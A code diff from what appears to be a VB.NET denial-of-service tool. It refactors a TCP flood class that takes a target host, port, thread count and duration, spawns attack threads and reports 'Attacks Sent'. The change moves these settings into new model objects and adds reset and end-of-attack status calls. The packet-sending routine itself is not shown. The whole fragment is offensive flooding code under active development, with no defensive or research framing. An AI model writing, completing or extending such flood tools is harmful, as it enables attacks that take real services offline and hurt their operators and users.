@@ -14,13 +14,14 @@ Public Class TCP
     Public Sub New(ByVal model As TcpModel)
         If Not AttackRunning = True Then
             AttackRunning = True
-            HostToAttack = model.Host
-            Port = model.Port
-            ThreadstoUse = model.ThreadstoUse
-            TimetoAttack = model.Time
-            msgLength = model.Length
+            HostToAttack = model.newBaseFloodModel.Host
+            Port = model.newTcpVariables.Port
+            ThreadstoUse = model.newBaseFloodModel.ThreadstoUse
+            TimetoAttack = model.newBaseFloodModel.Time
+            msgLength = model.newTcpVariables.Length
             Threads = New Thread(ThreadstoUse - 1) {}
-            GetFloodsBase().SetMessage("TCP attack")
+            GetFloodsBase().Reset()
+            GetFloodsBase().SetMessage("TCP attack started!")
             For i As Integer = 0 To ThreadstoUse - 1
                 Threads(i) = New Thread(AddressOf DoWork)
                 Threads(i).IsBackground = True
@@ -41,6 +42,7 @@ Public Class TCP
             AttackRunning = False
             GetFloodsBase().SetMessage("TCP Attack on " & HostToAttack & ":" & Port.ToString & " finished successfully. Attacks Sent: " & attacks.ToString)
             attacks = 0
+            GetFloodsBase().SetEnd()
         End If
 
     End Sub
